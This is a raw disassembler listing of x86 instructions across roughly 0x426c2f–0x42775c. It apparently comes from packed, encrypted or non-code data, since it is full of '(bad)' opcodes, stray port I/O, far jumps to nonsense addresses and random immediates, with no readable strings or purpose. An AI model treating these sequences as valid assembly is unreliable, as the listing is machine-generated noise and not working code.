  426c2f:	sub    DWORD PTR [edx-0x12820f1e],0x979e1dc3
  426c39:	arpl   WORD PTR ds:0x75653142,sp
  426c3f:	jmp    0x426c69
  426c41:	push   es
  426c42:	add    eax,0x63855a64
  426c47:	inc    esi
  426c48:	mov    ebx,0xbc40c145
  426c4d:	es inc edi
  426c4f:	and    DWORD PTR [esi+0x5d524b3d],ebp
  426c55:	sbb    edi,ecx
  426c57:	push   ds
  426c58:	data16 jnp 0x426c89
  426c5b:	inc    edx
  426c5c:	add    BYTE PTR [ebp+edi*4+0x544739a5],dl
  426c63:	adc    esp,DWORD PTR [ebx-0x5e]
  426c66:	pop    esi
  426c67:	and    eax,0x959a4ef9
  426c6c:	adc    BYTE PTR [ecx+0x0],al
	...
  426cd3:	add    BYTE PTR [eax],al
  426cd5:	add    dl,ah
  426cd7:	pusha  
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xc9fcdf80
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	mov    BYTE PTR [eax+0x2f5f7faa],bl
  426cf4:	cmp    BYTE PTR [ebp-0xb1da220],ah
  426cfa:	adc    BYTE PTR [esi],bh
  426cfc:	ror    ebx,cl
  426cfe:	ins    DWORD PTR es:[edi],dx
  426cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d00:	in     eax,dx
  426d01:	sub    eax,0xe603e926
  426d06:	int3   
  426d07:	imul   esi,edi,0xffffffe1
  426d0a:	mov    al,0xf9
  426d0c:	push   edi
  426d0d:	shl    DWORD PTR [edi],1
  426d0f:	adc    BYTE PTR [eax+0x76],ch
  426d12:	unpckhps xmm5,XMMWORD PTR [ecx-0x456bd4da]
  426d19:	jb     0x426d02
  426d1b:	mov    al,0xd5
  426d1d:	into   
  426d1e:	retf   
  426d1f:	dec    esp
  426d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d21:	(bad)  
  426d22:	(bad)  [ebx+0x2f]
  426d25:	jmp    0x426d4f
  426d27:	dec    ecx
  426d28:	sbb    BYTE PTR [ecx-0x45d67a56],0x19
  426d2f:	into   
  426d30:	enter  0x7510,0x5f
  426d34:	test   eax,0x15a77158
  426d39:	stos   BYTE PTR es:[edi],al
  426d3a:	mov    edx,0xfbb8ec89
  426d3f:	pop    ecx
  426d40:	adc    DWORD PTR [edx+ecx*1+0x235a59c5],ebp
  426d47:	cld    
  426d48:	loope  0x426d23
  426d4a:	dec    eax
  426d4b:	(bad)  
  426d4c:	or     dl,bh
  426d4e:	and    dh,ch
  426d50:	pop    ds
  426d51:	xor    dh,BYTE PTR ds:0xee4638e3
  426d57:	cld    
  426d58:	cmp    al,0x22
  426d5a:	retf   0xb3bc
  426d5d:	dec    esi
  426d5e:	xchg   esp,eax
  426d5f:	imul   ebp,esp,0xffffffab
  426d62:	push   cs
  426d63:	dec    esi
  426d64:	xchg   ecx,eax
  426d65:	leave  
  426d66:	dec    eax
  426d67:	mov    ch,BYTE PTR [ebx-0x13]
  426d6a:	fisub  DWORD PTR [ebx-0x1f]
  426d6d:	mov    ecx,0x5747261c
  426d72:	inc    eax
  426d73:	mov    bh,0xdb
  426d75:	xchg   edx,eax
  426d76:	xor    al,0x79
  426d78:	xlat   BYTE PTR ds:[ebx]
  426d79:	add    al,0x49
  426d7b:	add    ebp,DWORD PTR [edx]
  426d7d:	cwde   
  426d7e:	and    eax,0xe99d16e8
  426d83:	add    DWORD PTR [edi-0xac7f894],0xddc1efd9
  426d8d:	mov    esi,0x2d278b56
  426d92:	div    BYTE PTR [ecx-0x434b4681]
  426d98:	(bad)  
  426d99:	ffreep st(6)
  426d9b:	dec    ecx
  426d9c:	sub    DWORD PTR [esi],ebx
  426d9e:	inc    ebx
  426d9f:	pop    esi
  426da0:	mov    dh,0x4a
  426da2:	xchg   esp,eax
  426da3:	loopne 0x426e1b
  426da5:	or     dh,dl
  426da7:	dec    esi
  426da8:	sub    ch,ah
  426daa:	ror    edx,1
  426dac:	mov    esp,0xc6ad84eb
  426db1:	pop    edi
  426db2:	imul   eax,DWORD PTR [esi],0x20
  426db5:	jo     0x426e25
  426db7:	pop    edx
  426db8:	rcl    esi,cl
  426dba:	mov    ebx,DWORD PTR [edi]
  426dbc:	ins    DWORD PTR es:[edi],dx
  426dbd:	hlt    
  426dbe:	jns    0x426dca
  426dc0:	outs   dx,DWORD PTR ds:[esi]
  426dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dc2:	mov    dh,0x77
  426dc4:	jnp    0x426e3b
  426dc6:	xor    edi,DWORD PTR [esi]
  426dc8:	sahf   
  426dc9:	call   0xb0d2:0xb4497cc3
  426dd0:	inc    edx
  426dd1:	pop    esp
  426dd2:	in     eax,dx
  426dd3:	mov    eax,0xe381fa4
  426dd8:	inc    edi
  426dd9:	add    ah,bh
  426ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ddc:	mov    al,ds:0xe3b946d6
  426de1:	retf   0x2af8
  426de4:	mov    ch,0xc4
  426de6:	jp     0x426d99
  426de8:	and    eax,0xf7abe59d
  426ded:	add    BYTE PTR ds:[eax],al
	...
  426e54:	add    BYTE PTR [eax],al
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0x6b0c:0xc7c2ecf9
  426e63:	outs   dx,BYTE PTR ds:[esi]
  426e64:	ins    DWORD PTR es:[edi],dx
  426e65:	mov    edx,0x1a167
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	imul   esi,DWORD PTR [edi+0x527ade4d],0xfb43b755
  426e78:	repnz int 0xef
  426e7b:	and    eax,0x2f34f547
  426e80:	push   0x2523e331
  426e85:	ds and al,0xfa
  426e88:	das    
  426e89:	add    ah,BYTE PTR [esi-0x2a]
  426e8c:	mov    WORD PTR [esi+0x19],cs
  426e8f:	sbb    ah,BYTE PTR gs:[eax+0x2bdb3573]
  426e96:	add    al,0x3a
  426e98:	fistp  DWORD PTR [esi]
  426e9a:	jmp    0x426e71
  426e9c:	mov    bl,0xde
  426e9e:	xor    dl,ah
  426ea0:	or     BYTE PTR [ecx-0x3a],ch
  426ea3:	shl    BYTE PTR [edi+ebp*1+0x55e8755b],1
  426eaa:	inc    esp
  426eab:	jne    0x426ee5
  426ead:	or     eax,0x8205a95e
  426eb2:	fwait
  426eb3:	aam    0x75
  426eb5:	push   eax
  426eb6:	mov    ah,0x50
  426eb8:	call   0x15fe1760
  426ebd:	clc    
  426ebe:	aam    0x9f
  426ec0:	imul   ebp,DWORD PTR [edx+0x4],0xd8533590
  426ec7:	das    
  426ec8:	int3   
  426ec9:	or     eax,0x534e5339
  426ece:	mov    ah,0xd2
  426ed0:	add    al,0xcf
  426ed2:	push   ebp
  426ed3:	ins    BYTE PTR es:[edi],dx
  426ed4:	jbe    0x426f4a
  426ed6:	cmp    BYTE PTR [eax+0x3844b287],bh
  426edc:	pop    edx
  426edd:	and    eax,0xebfccf05
  426ee2:	push   0x89219440
  426ee7:	pop    eax
  426ee8:	pop    edx
  426ee9:	stos   DWORD PTR es:[edi],eax
  426eea:	inc    BYTE PTR [esi+ebx*1-0x34bece81]
  426ef1:	push   edx
  426ef2:	sbb    DWORD PTR [ebx+0x25],esi
  426ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ef6:	and    ch,BYTE PTR [ecx]
  426ef8:	mov    eax,0xdc5781e6
  426efd:	inc    BYTE PTR [bx+0xadf]
  426f02:	push   ebp
  426f03:	and    dl,cl
  426f05:	(bad)  
  426f07:	cmp    dl,ch
  426f09:	add    cl,ch
  426f0b:	fdiv   DWORD PTR [eax+0x7039c6f9]
  426f11:	inc    ecx
  426f12:	je     0x426f7a
  426f14:	push   eax
  426f15:	cmp    BYTE PTR ds:0x50b55649,al
  426f1b:	(bad)  
  426f1c:	ficom  DWORD PTR [ebp-0x232fed1]
  426f22:	inc    eax
  426f23:	inc    ebx
  426f24:	out    dx,al
  426f25:	jmp    0x426f06
  426f27:	push   cs
  426f28:	push   0x3d
  426f2a:	inc    edx
  426f2b:	scas   eax,DWORD PTR es:[edi]
  426f2c:	fnstcw WORD PTR [edx-0x3e]
  426f2f:	pushf  
  426f30:	mov    edx,0xe92d590f
  426f35:	arpl   WORD PTR [ebp-0xf],bx
  426f38:	enter  0x24f,0xcd
  426f3c:	std    
  426f3d:	imul   edx,DWORD PTR ds:0xee94b71d,0x35
  426f44:	xchg   ebx,eax
  426f45:	add    eax,0xc509ee4e
  426f4a:	push   esi
  426f4b:	mov    ecx,0x3523cbbb
  426f50:	sub    DWORD PTR [ebx-0x32b9fac5],ebp
  426f56:	sub    bl,ch
  426f58:	inc    ebp
  426f59:	jbe    0x426f49
  426f5b:	jle    0x426f9f
  426f5d:	cmp    al,ah
  426f5f:	repz and eax,0xc6f2c2c0
  426f65:	or     BYTE PTR [edi-0x644be634],0xdb
  426f6c:	mov    DWORD PTR [edi+0x0],esp
	...
  426fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd7:	mov    ds:0xf5c7f1c7,al
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [edi+eiz*4+0x6700fae6],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	pusha  
  426fef:	mov    eax,ds:0x2eb43dfd
  426ff4:	xor    DWORD PTR [ebp+0x3b],eax
  426ff7:	lahf   
  426ff8:	fwait
  426ff9:	in     eax,dx
  426ffa:	push   ss
  426ffb:	icebp  
  426ffc:	lods   eax,DWORD PTR ds:[esi]
  426ffd:	xor    al,0x2a
  426fff:	sti    
  427000:	and    DWORD PTR [esp+eax*4],esp
  427003:	push   ds
  427004:	(bad)  
  427005:	xor    eax,DWORD PTR [ebx]
  427007:	pushf  
  427008:	sar    DWORD PTR [eax-0x54b44b61],0xce
  42700f:	into   
  427010:	call   0x1ae549cc
  427015:	xchg   edx,eax
  427016:	std    
  427017:	xchg   ebp,eax
  427018:	loop   0x42702c
  42701a:	jno    0x427000
  42701c:	rcl    dl,cl
  42701e:	imul   esi,DWORD PTR [ecx+0x3c],0x374671b
  427025:	cdq    
  427026:	mov    ch,0x34
  427028:	jb     0x426fed
  42702a:	pop    esp
  42702b:	stos   DWORD PTR es:[edi],eax
  42702c:	in     al,dx
  42702d:	pop    eax
  42702e:	std    
  42702f:	dec    ecx
  427030:	out    0x1e,al
  427032:	cwde   
  427033:	inc    ecx
  427034:	pop    es
  427035:	cld    
  427036:	sub    al,0x49
  427038:	pop    ecx
  427039:	sbb    dl,BYTE PTR [edx+0x1b]
  42703c:	jmp    0x427082
  42703e:	and    dl,dh
  427040:	and    al,0x3d
  427042:	fdiv   QWORD PTR [esp+eax*8]
  427045:	sbb    ebx,DWORD PTR [edi+0x33]
  427048:	enter  0xcf0,0xf3
  42704c:	jae    0x42707d
  42704e:	jns    0x427099
  427050:	push   es
  427051:	mov    BYTE PTR [ebx],al
  427053:	pop    edi
  427054:	xchg   ecx,eax
  427055:	add    ecx,ebp
  427057:	push   ecx
  427058:	sub    ecx,DWORD PTR [eax+esi*4]
  42705b:	sub    BYTE PTR [esi+eax*1-0x183374fa],0xd8
  427063:	div    DWORD PTR [ebp+0x71e6fbba]
  427069:	js     0x4270c3
  42706b:	imul   ebp,DWORD PTR [eax-0xfc38b86],0x6e508dea
  427075:	cmp    eax,0xfcba2788
  42707a:	mov    dh,0x8f
  42707c:	scas   al,BYTE PTR es:[edi]
  42707d:	nop
  42707e:	dec    ecx
  42707f:	inc    ecx
  427080:	jg     0x4270a9
  427082:	mov    DWORD PTR [esi+0x4b620c69],ebx
  427088:	sar    DWORD PTR [ebx-0x7b],0xfd
  42708c:	sbb    al,0x13
  42708e:	mov    ds:0xaf929649,eax
  427093:	lock outs dx,DWORD PTR ds:[esi]
  427095:	imul   ebx,DWORD PTR [edx+ecx*4-0x61e393bb],0x43
  42709d:	es sbb eax,0xa71b3bf8
  4270a3:	add    ch,cl
  4270a5:	pop    esi
  4270a6:	clc    
  4270a7:	test   BYTE PTR [edi],cl
  4270a9:	xchg   DWORD PTR [ecx+0x3f],esi
  4270ac:	fldcw  WORD PTR ds:0xa5e85b84
  4270b2:	arpl   di,si
  4270b4:	jb     0x427053
  4270b6:	clc    
  4270b7:	daa    
  4270b8:	or     al,BYTE PTR [ebx-0x672cacb0]
  4270be:	not    BYTE PTR ds:0xb6e11297
  4270c4:	mov    bh,0x96
  4270c6:	sub    DWORD PTR [ecx],0x18b9f749
  4270cc:	scas   eax,DWORD PTR es:[edi]
  4270cd:	pop    esp
  4270ce:	jnp    0x42705d
  4270d0:	repz or al,0x1c
  4270d3:	jnp    0x4270f6
  4270d5:	xor    DWORD PTR [ebp-0x2f],ecx
  4270d8:	fsubrp st(5),st
  4270da:	or     eax,0x843daab0
  4270df:	pop    eax
  4270e0:	cmp    BYTE PTR [edx+0x5055b0e2],bl
  4270e6:	int    0x1a
  4270e8:	sub    bl,bl
  4270ea:	push   edi
  4270eb:	femms  
  4270ed:	xor    DWORD PTR [eax],eax
	...
  427153:	add    BYTE PTR [eax],al
  427155:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42715c:	(bad)  
  42715d:	std    
  42715e:	inc    esp
  42715f:	mov    ebp,0x861b9d96
  427164:	jmp    0x0:0x1a3677c
  42716b:	add    DWORD PTR [eax],eax
  42716d:	add    BYTE PTR [ebp+0x1b523c05],bl
  427173:	add    ebp,ecx
  427175:	int    0xe0
  427177:	dec    ecx
  427178:	mov    WORD PTR [ebx+0x6a9acc58],gs
  42717e:	push   es
  42717f:	xchg   ecx,eax
  427180:	push   edx
  427181:	ret    
  427182:	shr    DWORD PTR ds:0x28a9c404,1
  427188:	lahf   
  427189:	out    dx,al
  42718a:	mov    ds,WORD PTR [edi-0xb2f5270]
  427190:	sub    al,0x3c
  427192:	sub    BYTE PTR [eax],dl
  427194:	mov    eax,ds:0x6d2b8189
  427199:	lock fldenv [edx+edi*2]
  42719d:	add    BYTE PTR [edi+esi*1],al
  4271a0:	ret    0x989d
  4271a3:	xor    DWORD PTR cs:[esi*1+0x5c752a2b],edx
  4271ab:	dec    ecx
  4271ac:	mov    WORD PTR ds:0x8a3193cc,es
  4271b2:	xchg   ebx,eax
  4271b3:	jno    0x42714d
  4271b5:	data16 stos BYTE PTR es:[edi],al
  4271b7:	data16 stos BYTE PTR es:[di],al
  4271ba:	test   eax,0xa7407ddd
  4271bf:	mov    eax,esp
  4271c1:	(bad)  
  4271c3:	inc    edi
  4271c4:	rcr    DWORD PTR [esi+eax*2+0x1ca39927],cl
  4271cb:	add    bl,BYTE PTR [edx+edx*8+0x34313005]
  4271d2:	xor    ch,cl
  4271d4:	mov    al,0xa
  4271d6:	or     ebx,DWORD PTR [eax]
  4271d8:	ja     0x42715a
  4271da:	js     0x4271a2
  4271dc:	and    dl,BYTE PTR [ecx-0x7fc39d4b]
  4271e2:	sub    eax,edx
  4271e4:	jmp    0x427213
  4271e6:	add    al,0x39
  4271e8:	aaa    
  4271e9:	mov    BYTE PTR [edi-0x10],0xb8
  4271ed:	pop    ebx
  4271ee:	cmp    eax,0x1cc7134c
  4271f3:	push   esp
  4271f4:	stc    
  4271f5:	hlt    
  4271f6:	sbb    ch,dl
  4271f8:	add    ecx,DWORD PTR [ecx+ecx*2]
  4271fb:	mov    eax,ds:0xf72d35a9
  427200:	mov    eax,0x5854e9a
  427205:	pop    esp
  427206:	add    DWORD PTR [ecx+0x45c189b6],esp
  42720c:	mov    ebx,DWORD PTR fs:[esi-0x52]
  427210:	fnstenv [esi]
  427212:	dec    ecx
  427213:	sbb    DWORD PTR ds:0x61a59f7f,eax
  427219:	xchg   ecx,eax
  42721a:	mov    esp,0x32aa8d40
  42721f:	loopne 0x4271ae
  427221:	stc    
  427222:	mov    bh,0x35
  427224:	or     DWORD PTR [edi],edx
  427226:	adc    DWORD PTR [eax],ebp
  427228:	(bad)  
  42722a:	jmp    0x737b:0x272f6668
  427231:	ins    DWORD PTR es:[di],dx
  427233:	inc    ebp
  427234:	test   al,0x49
  427236:	dec    eax
  427237:	jns    0x427298
  427239:	and    ch,al
  42723b:	nop
  42723c:	sbb    al,0x78
  42723e:	jg     0x4272aa
  427240:	jns    0x42727a
  427242:	cmp    al,0x6e
  427244:	loop   0x4271c6
  427246:	xor    esp,eax
  427248:	mov    BYTE PTR [ebx],dl
  42724a:	loopne 0x427215
  42724c:	cmovp  esp,DWORD PTR [eax-0xa1c6f2c]
  427253:	pop    es
  427254:	leave  
  427255:	mov    esp,0x44a5b3f3
  42725a:	push   ecx
  42725b:	add    ah,BYTE PTR [ecx+eax*1-0x6b1e8e08]
  427262:	mov    ebx,DWORD PTR [edi+0x66]
  427265:	sbb    ah,al
  427267:	or     cl,BYTE PTR ds:0x26064b71
  42726d:	lea    eax,[eax]
	...
  4272d3:	add    BYTE PTR [eax],al
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xc40b8229,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	mov    cl,0x8e
  4272f0:	jbe    0x4272c3
  4272f2:	xchg   ecx,eax
  4272f3:	and    eax,0xb5594213
  4272f8:	jae    0x427322
  4272fa:	loope  0x427331
  4272fc:	(bad)  
  4272fd:	xlat   BYTE PTR ds:[ebx]
  4272fe:	and    DWORD PTR [ecx-0x2a07930b],edi
  427304:	add    ah,bh
  427306:	mov    bh,0xfe
  427308:	push   ecx
  427309:	sub    DWORD PTR ds:0x3d537ae1,edi
  42730f:	mov    ah,0x68
  427311:	jp     0x427347
  427313:	jo     0x4272c4
  427315:	sbb    esp,DWORD PTR [eax-0x1b1eda1e]
  42731b:	jp     0x4272a7
  42731d:	test   DWORD PTR [ebx-0x3e],edx
  427320:	cmp    dh,bl
  427322:	cmp    eax,0xda6edd0d
  427327:	mov    cl,BYTE PTR [ebx-0x58]
  42732a:	inc    edi
  42732b:	or     al,0x60
  42732d:	leave  
  42732e:	rdtsc  
  427330:	push   0x89ee9cc9
  427335:	mov    esi,0x97b3dca7
  42733a:	inc    eax
  42733b:	mov    dh,0xf4
  42733d:	inc    esi
  42733e:	pop    ds
  42733f:	and    al,0x9f
  427341:	ret    0x97b4
  427344:	jge    0x4273b7
  427346:	xor    cl,BYTE PTR [ecx-0xa]
  427349:	stos   BYTE PTR es:[edi],al
  42734a:	pop    ebx
  42734b:	pop    ds
  42734c:	(bad)  
  42734d:	jmp    0x510d:0xff91f833
  427354:	mov    al,0x4f
  427356:	xchg   esi,eax
  427357:	xchg   esi,eax
  427358:	mov    al,ds:0xeffc83ff
  42735d:	jns    0x427374
  42735f:	jbe    0x427365
  427361:	mov    dl,cl
  427363:	push   0xffffffba
  427365:	cmp    bl,ch
  427367:	js     0x4273b0
  427369:	sbb    BYTE PTR [ebx+0x13],0x0
  42736d:	lods   al,BYTE PTR ds:[esi]
  42736e:	mov    ebp,0x9ec9299
  427373:	push   eax
  427374:	jmp    0xbf79:0x6ec53b3b
  42737b:	iret   
  42737c:	rcr    BYTE PTR [ebx+ebp*4],cl
  42737f:	xchg   edx,eax
  427380:	sbb    eax,0xb3c65225
  427385:	push   ebx
  427386:	mov    ds:0xb187eb9c,eax
  42738b:	cmp    edx,0x23
  42738e:	test   BYTE PTR [ecx-0x5167102f],al
  427394:	adc    al,0x4
  427396:	push   eax
  427397:	mov    ecx,DWORD PTR [esi]
  427399:	and    eax,0x4d1b5157
  42739e:	or     BYTE PTR [ebx+0x2ab1c4c1],0x1a
  4273a5:	xor    ah,BYTE PTR [esi]
  4273a7:	cld    
  4273a8:	adc    ah,bl
  4273aa:	push   ds
  4273ab:	adc    al,BYTE PTR [edi+0x17]
  4273ae:	(bad)  
  4273af:	(bad)  
  4273b1:	or     al,0x35
  4273b3:	xor    bh,bl
  4273b5:	dec    edx
  4273b6:	enter  0x7583,0x40
  4273ba:	sub    DWORD PTR [esi-0x76],esi
  4273bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273be:	push   ss
  4273bf:	xor    DWORD PTR ds:0xbd06752d,ecx
  4273c5:	sbb    DWORD PTR [edx-0x28d67b81],0x6d
  4273cc:	repz scas eax,DWORD PTR es:[edi]
  4273ce:	cmp    bl,BYTE PTR [eax]
  4273d0:	sahf   
  4273d1:	imul   esi,esi,0xffffff99
  4273d4:	(bad)  
  4273d6:	outs   dx,DWORD PTR ds:[esi]
  4273d7:	cli    
  4273d8:	jecxz  0x4273e9
  4273da:	mov    ah,0x29
  4273dc:	sbb    ebp,ebx
  4273de:	iret   
  4273df:	push   ds
  4273e0:	shl    DWORD PTR [edi-0x6c],0xe1
  4273e4:	fimul  DWORD PTR [edi+0x7a]
  4273e7:	cs ss mov ebp,0xf18ca887
	...
  427456:	adc    bl,BYTE PTR ds:0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    ebp,esp
  427463:	ss in  eax,dx
  427465:	out    dx,eax
  427466:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	sbb    eax,0x369e863b
  427473:	arpl   bp,di
  427475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427476:	or     al,0x5
  427478:	mov    DWORD PTR [ebx-0x25],edi
  42747b:	outs   dx,BYTE PTR ds:[esi]
  42747c:	or     al,0x85
  42747e:	push   es
  42747f:	sub    dl,dh
  427481:	sbb    bh,BYTE PTR [edx+0x6f]
  427484:	adc    BYTE PTR [ecx+0xfe81e28],al
  42748a:	mov    bl,0x4d
  42748c:	rol    dl,1
  42748e:	jb     0x427455
  427490:	xor    BYTE PTR [esi+ecx*4-0xb7dd369],bh
  427497:	idiv   DWORD PTR ds:0x1c01f7a0
  42749d:	jp     0x427510
  42749f:	lock xor ebx,edi
  4274a2:	mov    bh,0x25
  4274a4:	jmp    0xe058a91b
  4274a9:	jmp    0x364922ca
  4274ae:	mov    esp,0x951997c2
  4274b3:	test   ebx,0xee215549
  4274b9:	test   eax,0x68b413f0
  4274be:	stos   DWORD PTR es:[edi],eax
  4274bf:	aas    
  4274c0:	aas    
  4274c1:	dec    esi
  4274c2:	mov    al,0xa8
  4274c4:	inc    ecx
  4274c5:	cmp    eax,DWORD PTR [ecx+0x4cecf7e6]
  4274cb:	data16 gs in al,0x2a
  4274cf:	xchg   ecx,eax
  4274d0:	pop    esp
  4274d1:	imul   ebp,DWORD PTR [eax*2-0x3268498d],0xa59304e1
  4274dc:	add    BYTE PTR [edx+0x5e5ce36b],cl
  4274e2:	lods   al,BYTE PTR ds:[esi]
  4274e3:	not    DWORD PTR [ebx]
  4274e5:	bts    ebx,edi
  4274e8:	push   esp
  4274e9:	lds    edx,FWORD PTR [edx]
  4274eb:	call   FWORD PTR [esi+eax*4-0x12]
  4274ef:	test   BYTE PTR [ecx+0x72741bcc],ch
  4274f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274f7:	scas   eax,DWORD PTR es:[edi]
  4274f8:	and    BYTE PTR [ecx*1+0x6b8b5a51],bl
  4274ff:	out    0x7c,al
  427501:	dec    esp
  427502:	outs   dx,DWORD PTR ds:[esi]
  427503:	in     al,dx
  427504:	clc    
  427505:	xor    al,0x35
  427507:	enter  0xa88,0x9
  42750b:	fmul   DWORD PTR [esi-0x23]
  42750e:	scas   eax,DWORD PTR es:[edi]
  42750f:	inc    edx
  427510:	and    al,0xf7
  427512:	fs enter 0x13fb,0xcc
  427517:	sbb    al,0x32
  427519:	pushf  
  42751a:	cmc    
  42751b:	jp     0x427534
  42751d:	mov    ds:0x75f48cfb,eax
  427522:	(bad)  
  427523:	xchg   edx,eax
  427524:	repnz add al,0x63
  427527:	gs retf 
  427529:	pop    es
  42752a:	retf   
  42752b:	(bad)  
  42752c:	xchg   esi,eax
  42752d:	inc    edx
  42752e:	push   esi
  42752f:	mov    ch,0x79
  427531:	lock rol DWORD PTR [esi],0xf3
  427535:	mov    eax,0xc54151a0
  42753a:	push   eax
  42753b:	iret   
  42753c:	mov    cl,0xcf
  42753e:	and    eax,0xcec8d4e8
  427543:	rcl    DWORD PTR [ebx-0x73],1
  427546:	scas   al,BYTE PTR es:[edi]
  427547:	dec    edx
  427548:	or     esp,DWORD PTR [edi-0x3f8501b9]
  42754e:	stc    
  42754f:	xchg   ecx,eax
  427550:	dec    edi
  427552:	mov    edx,0x8472d453
  427557:	test   al,0x80
  427559:	in     eax,0x8
  42755b:	inc    ebx
  42755c:	std    
  42755d:	rcl    BYTE PTR [edx+0x1c199435],cl
  427563:	jns    0x4275d0
  427565:	rol    DWORD PTR [esi],cl
  427567:	in     al,0xc0
  427569:	sti    
  42756a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42756b:	mov    ds:0x52ca,al
	...
  4275d4:	add    BYTE PTR [eax],al
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	mov    ebp,0x671f34dc
  4275e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	xchg   DWORD PTR [ecx-0x7451b07e],edi
  4275f4:	sub    ah,BYTE PTR [eax]
  4275f6:	mov    ecx,0xaa240962
  4275fb:	mov    ah,0xb5
  4275fd:	ret    0x551e
  427600:	stos   DWORD PTR es:[edi],eax
  427601:	inc    BYTE PTR ds:[ebx+0x1bd94e7a]
  427608:	push   edx
  427609:	mov    bh,BYTE PTR [ebp-0x7c]
  42760c:	inc    esi
  42760d:	inc    ecx
  42760e:	shl    DWORD PTR [edi-0x111777f],0x52
  427615:	pop    edi
  427616:	sbb    ch,BYTE PTR [edx+0x5a9cc7a0]
  42761c:	idiv   ebx
  42761e:	sbb    eax,0x6ae25208
  427623:	mov    ah,0x7d
  427625:	mov    edi,0x71b0ceaf
  42762a:	shl    DWORD PTR [eax+ebp*8+0x60],cl
  42762e:	(bad)  
  427630:	and    al,0xfb
  427632:	loop   0x42766c
  427634:	xor    ch,BYTE PTR [edi]
  427636:	or     DWORD PTR [esi],ecx
  427638:	mov    ds:0xe0eacef5,eax
  42763d:	call   0xd40e55fe
  427642:	inc    ecx
  427643:	int    0x8e
  427645:	dec    edi
  427646:	ftst   
  427648:	call   0x77c7e9f9
  42764d:	dec    edi
  42764e:	fidiv  WORD PTR [ebx]
  427650:	jmp    0xd43fdc9a
  427655:	in     al,0x17
  427657:	fwait
  427658:	pop    ecx
  427659:	js     0x427613
  42765b:	jb     0x4276aa
  42765d:	out    dx,al
  42765e:	adc    BYTE PTR [eax+0x99606ee],ch
  427664:	int    0xc8
  427666:	or     al,0x43
  427668:	fwait
  427669:	pop    es
  42766a:	dec    edi
  42766b:	inc    esi
  42766c:	mov    esp,0xbdebbe9e
  427671:	bound  ebp,QWORD PTR [eax]
  427673:	sar    DWORD PTR [ebx+0x53e5e2e6],1
  427679:	retf   0xbddd
  42767c:	and    al,0xd8
  42767e:	cmc    
  42767f:	repnz xchg esi,eax
  427681:	push   0x27
  427683:	jle    0x427610
  427685:	call   0xd214:0xf162c6a6
  42768c:	fdivr  QWORD PTR [bp+si-0x6449]
  427691:	fcomip st,st(5)
  427693:	push   ebx
  427694:	cmp    DWORD PTR [ecx+0x1ae7d42d],ebx
  42769a:	sbb    eax,0xf54782f5
  42769f:	mov    bh,0xe7
  4276a1:	inc    esp
  4276a2:	out    dx,eax
  4276a3:	test   DWORD PTR [eax-0x55],ebx
  4276a6:	jmp    0x4276b9
  4276a8:	jno    0x427729
  4276aa:	das    
  4276ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276ac:	shr    BYTE PTR [ecx+0x65d79f62],0x63
  4276b3:	stos   DWORD PTR es:[edi],eax
  4276b4:	pop    ebp
  4276b5:	test   eax,0x1da27821
  4276ba:	aas    
  4276bb:	pop    esp
  4276bc:	adc    al,ah
  4276be:	and    dl,BYTE PTR [ecx+0xf4a28ae]
  4276c4:	push   0x71
  4276c6:	cs test eax,0xbbc86e94
  4276cc:	fwait
  4276cd:	js     0x427743
  4276cf:	rcl    BYTE PTR [ebp-0x6b],0xaa
  4276d3:	cld    
  4276d4:	jecxz  0x4276b3
  4276d6:	cmp    BYTE PTR [edi],cl
  4276d8:	loop   0x427729
  4276da:	sbb    ah,bh
  4276dc:	jmp    0xaef4:0xe8f8a774
  4276e3:	jmp    0xe9c4:0x840aad1c
  4276ea:	sub    DWORD PTR [ebx],eax
  4276ec:	int3   
  4276ed:	mov    ah,0x0
	...
  427753:	add    BYTE PTR [eax],al
  427755:	add    BYTE PTR [ecx],al
  427757:	push   esi
  427758:	nop
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
